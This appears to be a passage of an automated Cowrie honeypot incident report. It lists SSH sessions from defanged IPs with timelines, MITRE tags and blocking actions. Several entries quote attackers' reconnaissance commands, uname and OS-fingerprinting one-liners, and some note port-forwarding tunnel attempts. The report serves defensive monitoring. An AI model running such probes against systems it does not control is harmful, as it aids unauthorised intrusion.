| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:06 |
| **Last Seen** | 2026-07-24 08:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:06:13` | `cowrie.session.connect` |
| `2026-07-24 08:06:13` | `cowrie.client.version` |
| `2026-07-24 08:06:13` | `cowrie.client.kex` |
| `2026-07-24 08:06:13` | `cowrie.login.success` |
| `2026-07-24 08:06:14` | `cowrie.session.params` |
| `2026-07-24 08:06:14` | `cowrie.command.input` |
| `2026-07-24 08:06:14` | `cowrie.log.closed` |
| `2026-07-24 08:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8139de08325

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:07 |
| **Last Seen** | 2026-07-24 08:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:07:25` | `cowrie.session.connect` |
| `2026-07-24 08:07:25` | `cowrie.client.version` |
| `2026-07-24 08:07:25` | `cowrie.client.kex` |
| `2026-07-24 08:07:27` | `cowrie.login.success` |
| `2026-07-24 08:07:29` | `cowrie.session.params` |
| `2026-07-24 08:07:29` | `cowrie.command.input` |
| `2026-07-24 08:07:29` | `cowrie.command.input` |
| `2026-07-24 08:07:29` | `cowrie.command.input` |
| `2026-07-24 08:07:29` | `cowrie.command.input` |
| `2026-07-24 08:07:29` | `cowrie.command.input` |
| `2026-07-24 08:07:29` | `cowrie.command.success` |
| `2026-07-24 08:07:29` | `cowrie.command.input` |
| `2026-07-24 08:07:29` | `cowrie.command.input` |
| `2026-07-24 08:07:29` | `cowrie.command.input` |
| `2026-07-24 08:07:29` | `cowrie.command.input` |
| `2026-07-24 08:07:30` | `cowrie.log.closed` |
| `2026-07-24 08:07:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fd4eeb7db74

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:08 |
| **Last Seen** | 2026-07-24 08:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:08:01` | `cowrie.session.connect` |
| `2026-07-24 08:08:01` | `cowrie.client.version` |
| `2026-07-24 08:08:01` | `cowrie.client.kex` |
| `2026-07-24 08:08:01` | `cowrie.login.success` |
| `2026-07-24 08:08:02` | `cowrie.session.params` |
| `2026-07-24 08:08:02` | `cowrie.command.input` |
| `2026-07-24 08:08:02` | `cowrie.log.closed` |
| `2026-07-24 08:08:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73d75505df8b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:09 |
| **Last Seen** | 2026-07-24 08:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:09:23` | `cowrie.session.connect` |
| `2026-07-24 08:09:23` | `cowrie.client.version` |
| `2026-07-24 08:09:23` | `cowrie.client.kex` |
| `2026-07-24 08:09:26` | `cowrie.login.success` |
| `2026-07-24 08:09:27` | `cowrie.session.params` |
| `2026-07-24 08:09:27` | `cowrie.command.input` |
| `2026-07-24 08:09:27` | `cowrie.command.input` |
| `2026-07-24 08:09:27` | `cowrie.command.input` |
| `2026-07-24 08:09:27` | `cowrie.command.input` |
| `2026-07-24 08:09:27` | `cowrie.command.input` |
| `2026-07-24 08:09:27` | `cowrie.command.success` |
| `2026-07-24 08:09:27` | `cowrie.command.input` |
| `2026-07-24 08:09:27` | `cowrie.command.input` |
| `2026-07-24 08:09:27` | `cowrie.command.input` |
| `2026-07-24 08:09:27` | `cowrie.command.input` |
| `2026-07-24 08:09:27` | `cowrie.log.closed` |
| `2026-07-24 08:09:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d6e07aa38c6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:09 |
| **Last Seen** | 2026-07-24 08:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:09:54` | `cowrie.session.connect` |
| `2026-07-24 08:09:54` | `cowrie.client.version` |
| `2026-07-24 08:09:54` | `cowrie.client.kex` |
| `2026-07-24 08:09:55` | `cowrie.login.success` |
| `2026-07-24 08:09:56` | `cowrie.session.params` |
| `2026-07-24 08:09:56` | `cowrie.command.input` |
| `2026-07-24 08:09:56` | `cowrie.log.closed` |
| `2026-07-24 08:09:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e26805bc696

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:11 |
| **Last Seen** | 2026-07-24 08:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:11:22` | `cowrie.session.connect` |
| `2026-07-24 08:11:22` | `cowrie.client.version` |
| `2026-07-24 08:11:22` | `cowrie.client.kex` |
| `2026-07-24 08:11:24` | `cowrie.login.success` |
| `2026-07-24 08:11:26` | `cowrie.session.params` |
| `2026-07-24 08:11:26` | `cowrie.command.input` |
| `2026-07-24 08:11:26` | `cowrie.command.input` |
| `2026-07-24 08:11:26` | `cowrie.command.input` |
| `2026-07-24 08:11:26` | `cowrie.command.input` |
| `2026-07-24 08:11:26` | `cowrie.command.input` |
| `2026-07-24 08:11:26` | `cowrie.command.success` |
| `2026-07-24 08:11:26` | `cowrie.command.input` |
| `2026-07-24 08:11:26` | `cowrie.command.input` |
| `2026-07-24 08:11:26` | `cowrie.command.input` |
| `2026-07-24 08:11:26` | `cowrie.command.input` |
| `2026-07-24 08:11:26` | `cowrie.log.closed` |
| `2026-07-24 08:11:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c046108b9bab

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:11 |
| **Last Seen** | 2026-07-24 08:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:11:46` | `cowrie.session.connect` |
| `2026-07-24 08:11:46` | `cowrie.client.version` |
| `2026-07-24 08:11:46` | `cowrie.client.kex` |
| `2026-07-24 08:11:46` | `cowrie.login.success` |
| `2026-07-24 08:11:47` | `cowrie.session.params` |
| `2026-07-24 08:11:47` | `cowrie.command.input` |
| `2026-07-24 08:11:47` | `cowrie.log.closed` |
| `2026-07-24 08:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4f557f49c26

| Field | Detail |
|---|---|
| **Source IP** | `65.20.143[.]45` |
| **First Seen** | 2026-07-24 08:12 |
| **Last Seen** | 2026-07-24 08:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:12:02` | `cowrie.session.connect` |
| `2026-07-24 08:12:02` | `cowrie.client.version` |
| `2026-07-24 08:12:02` | `cowrie.client.kex` |
| `2026-07-24 08:12:03` | `cowrie.login.success` |
| `2026-07-24 08:12:04` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.143[.]45` to AbuseIPDB if not already reported
- [ ] Block `65.20.143[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc47409d68d5

| Field | Detail |
|---|---|
| **Source IP** | `182.139.39[.]150` |
| **First Seen** | 2026-07-24 08:13 |
| **Last Seen** | 2026-07-24 08:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:13:12` | `cowrie.session.connect` |
| `2026-07-24 08:13:13` | `cowrie.client.version` |
| `2026-07-24 08:13:13` | `cowrie.client.kex` |
| `2026-07-24 08:13:16` | `cowrie.login.success` |
| `2026-07-24 08:13:17` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.139.39[.]150` to AbuseIPDB if not already reported
- [ ] Block `182.139.39[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30f0fe0aa643

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:13 |
| **Last Seen** | 2026-07-24 08:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:13:17` | `cowrie.session.connect` |
| `2026-07-24 08:13:17` | `cowrie.client.version` |
| `2026-07-24 08:13:17` | `cowrie.client.kex` |
| `2026-07-24 08:13:19` | `cowrie.login.success` |
| `2026-07-24 08:13:21` | `cowrie.session.params` |
| `2026-07-24 08:13:21` | `cowrie.command.input` |
| `2026-07-24 08:13:21` | `cowrie.command.input` |
| `2026-07-24 08:13:21` | `cowrie.command.input` |
| `2026-07-24 08:13:21` | `cowrie.command.input` |
| `2026-07-24 08:13:21` | `cowrie.command.input` |
| `2026-07-24 08:13:21` | `cowrie.command.success` |
| `2026-07-24 08:13:21` | `cowrie.command.input` |
| `2026-07-24 08:13:21` | `cowrie.command.input` |
| `2026-07-24 08:13:21` | `cowrie.command.input` |
| `2026-07-24 08:13:21` | `cowrie.command.input` |
| `2026-07-24 08:13:21` | `cowrie.log.closed` |
| `2026-07-24 08:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6d8512d611e

| Field | Detail |
|---|---|
| **Source IP** | `154.146.238[.]122` |
| **First Seen** | 2026-07-24 08:13 |
| **Last Seen** | 2026-07-24 08:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:13:26` | `cowrie.session.connect` |
| `2026-07-24 08:13:27` | `cowrie.client.version` |
| `2026-07-24 08:13:27` | `cowrie.client.kex` |
| `2026-07-24 08:13:28` | `cowrie.login.success` |
| `2026-07-24 08:13:28` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.146.238[.]122` to AbuseIPDB if not already reported
- [ ] Block `154.146.238[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e70c27b1a7c

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:13 |
| **Last Seen** | 2026-07-24 08:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:13:35` | `cowrie.session.connect` |
| `2026-07-24 08:13:35` | `cowrie.client.version` |
| `2026-07-24 08:13:35` | `cowrie.client.kex` |
| `2026-07-24 08:13:36` | `cowrie.login.success` |
| `2026-07-24 08:13:36` | `cowrie.session.params` |
| `2026-07-24 08:13:36` | `cowrie.command.input` |
| `2026-07-24 08:13:36` | `cowrie.log.closed` |
| `2026-07-24 08:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99defe298a02

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:15 |
| **Last Seen** | 2026-07-24 08:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:15:14` | `cowrie.session.connect` |
| `2026-07-24 08:15:14` | `cowrie.client.version` |
| `2026-07-24 08:15:14` | `cowrie.client.kex` |
| `2026-07-24 08:15:16` | `cowrie.login.success` |
| `2026-07-24 08:15:17` | `cowrie.session.params` |
| `2026-07-24 08:15:17` | `cowrie.command.input` |
| `2026-07-24 08:15:17` | `cowrie.command.input` |
| `2026-07-24 08:15:18` | `cowrie.command.input` |
| `2026-07-24 08:15:18` | `cowrie.command.input` |
| `2026-07-24 08:15:18` | `cowrie.command.input` |
| `2026-07-24 08:15:18` | `cowrie.command.success` |
| `2026-07-24 08:15:18` | `cowrie.command.input` |
| `2026-07-24 08:15:18` | `cowrie.command.input` |
| `2026-07-24 08:15:18` | `cowrie.command.input` |
| `2026-07-24 08:15:18` | `cowrie.command.input` |
| `2026-07-24 08:15:18` | `cowrie.log.closed` |
| `2026-07-24 08:15:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13d14082ce7b

| Field | Detail |
|---|---|
| **Source IP** | `60.167.19[.]189` |
| **First Seen** | 2026-07-24 08:15 |
| **Last Seen** | 2026-07-24 08:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:15:16` | `cowrie.session.connect` |
| `2026-07-24 08:15:17` | `cowrie.client.version` |
| `2026-07-24 08:15:17` | `cowrie.client.kex` |
| `2026-07-24 08:15:19` | `cowrie.login.success` |
| `2026-07-24 08:15:19` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:15:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.167.19[.]189` to AbuseIPDB if not already reported
- [ ] Block `60.167.19[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56b9f359ebf4

| Field | Detail |
|---|---|
| **Source IP** | `50.187.155[.]130` |
| **First Seen** | 2026-07-24 08:15 |
| **Last Seen** | 2026-07-24 08:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:15:25` | `cowrie.session.connect` |
| `2026-07-24 08:15:26` | `cowrie.client.version` |
| `2026-07-24 08:15:26` | `cowrie.client.kex` |
| `2026-07-24 08:15:27` | `cowrie.login.success` |
| `2026-07-24 08:15:27` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:15:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.187.155[.]130` to AbuseIPDB if not already reported
- [ ] Block `50.187.155[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4c861e05a2b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:15 |
| **Last Seen** | 2026-07-24 08:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:15:31` | `cowrie.session.connect` |
| `2026-07-24 08:15:31` | `cowrie.client.version` |
| `2026-07-24 08:15:31` | `cowrie.client.kex` |
| `2026-07-24 08:15:31` | `cowrie.login.success` |
| `2026-07-24 08:15:32` | `cowrie.session.params` |
| `2026-07-24 08:15:32` | `cowrie.command.input` |
| `2026-07-24 08:15:32` | `cowrie.log.closed` |
| `2026-07-24 08:15:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e474551c862

| Field | Detail |
|---|---|
| **Source IP** | `203.92.36[.]109` |
| **First Seen** | 2026-07-24 08:15 |
| **Last Seen** | 2026-07-24 08:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:15:57` | `cowrie.session.connect` |
| `2026-07-24 08:15:58` | `cowrie.client.version` |
| `2026-07-24 08:15:58` | `cowrie.client.kex` |
| `2026-07-24 08:16:00` | `cowrie.login.success` |
| `2026-07-24 08:16:01` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.92.36[.]109` to AbuseIPDB if not already reported
- [ ] Block `203.92.36[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a9de67bcf69

| Field | Detail |
|---|---|
| **Source IP** | `65.20.138[.]3` |
| **First Seen** | 2026-07-24 08:16 |
| **Last Seen** | 2026-07-24 08:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:16:06` | `cowrie.session.connect` |
| `2026-07-24 08:16:06` | `cowrie.client.version` |
| `2026-07-24 08:16:06` | `cowrie.client.kex` |
| `2026-07-24 08:16:08` | `cowrie.login.success` |
| `2026-07-24 08:16:08` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:16:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.138[.]3` to AbuseIPDB if not already reported
- [ ] Block `65.20.138[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b95dec52e39d

| Field | Detail |
|---|---|
| **Source IP** | `124.88.174[.]143` |
| **First Seen** | 2026-07-24 08:16 |
| **Last Seen** | 2026-07-24 08:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:16:43` | `cowrie.session.connect` |
| `2026-07-24 08:16:44` | `cowrie.client.version` |
| `2026-07-24 08:16:44` | `cowrie.client.kex` |
| `2026-07-24 08:16:46` | `cowrie.login.success` |
| `2026-07-24 08:16:47` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:16:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.88.174[.]143` to AbuseIPDB if not already reported
- [ ] Block `124.88.174[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec52130ee03a

| Field | Detail |
|---|---|
| **Source IP** | `96.56.228[.]149` |
| **First Seen** | 2026-07-24 08:16 |
| **Last Seen** | 2026-07-24 08:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:16:56` | `cowrie.session.connect` |
| `2026-07-24 08:16:57` | `cowrie.client.version` |
| `2026-07-24 08:16:57` | `cowrie.client.kex` |
| `2026-07-24 08:16:58` | `cowrie.login.success` |
| `2026-07-24 08:16:58` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:17:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.56.228[.]149` to AbuseIPDB if not already reported
- [ ] Block `96.56.228[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

